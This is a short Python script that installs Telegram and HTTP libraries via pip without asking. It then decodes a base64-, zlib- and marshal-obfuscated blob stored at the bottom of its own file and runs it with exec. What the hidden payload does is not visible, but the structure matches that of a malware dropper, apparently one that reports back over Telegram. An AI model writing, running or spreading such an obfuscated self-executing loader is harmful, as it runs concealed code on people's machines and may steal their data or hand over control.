import subprocess
import sys
import base64
import zlib
import marshal

subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])

with open(__file__, "r", encoding="utf-8") as f:
    data = f.read()
secure_data = data.split("# DATA")[1].strip()
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)

# DATA
eJxLZkACbFD68x4gMZ0hhSGFMYchlzGKkRHEZsphimJKYY5iZmJIZUxlXsOymhGiPIollSWLiwEDZPFgikWxA3VzpLKnsK5mgoiYMkRxAvWLYqpNYUvlXMMOUwd0AxMIIviVTMoMhgzFjOVMjAyRQD5IpII5kqGcUZPjJUiJJuMtZqf8Er8qPQtDc3MDSzMTA1MrR0c3z0L3/GxDA5dc51T//IyyNPOg+PKKlAyzPPegQHMv71CgPtaS/OzUvFtMRUlV3A6JFfk5+SU58bnJmky32JMzEkviM1NucaTkJ5fmpuaVaHLf4ihJzUlNL0rMLQK57hZTfvEtzqT8kniIKcxA5i324tTi4sz8vFscaZk5qXmJuam3eKBC8SCRWyz5BUC1jGm3eItT81LiYaavZPgM8ssvDpvikqLMvHS7Wxw2ufkppTmpdkUi4HBgYCgOARIfmBkZGZ8ySNxm4HzAY9PAeZONcwLnFTapBuYb/EL91Z3V1/mVL/IrN/DcZOXs0JnBcoVVdoHgDRb26yyiF1lEZ+RuSLzAInqFxeI7MwOb3HVW2Yussr+KuYEGbxVxFGI+KMTqKM0OAEbFicY=
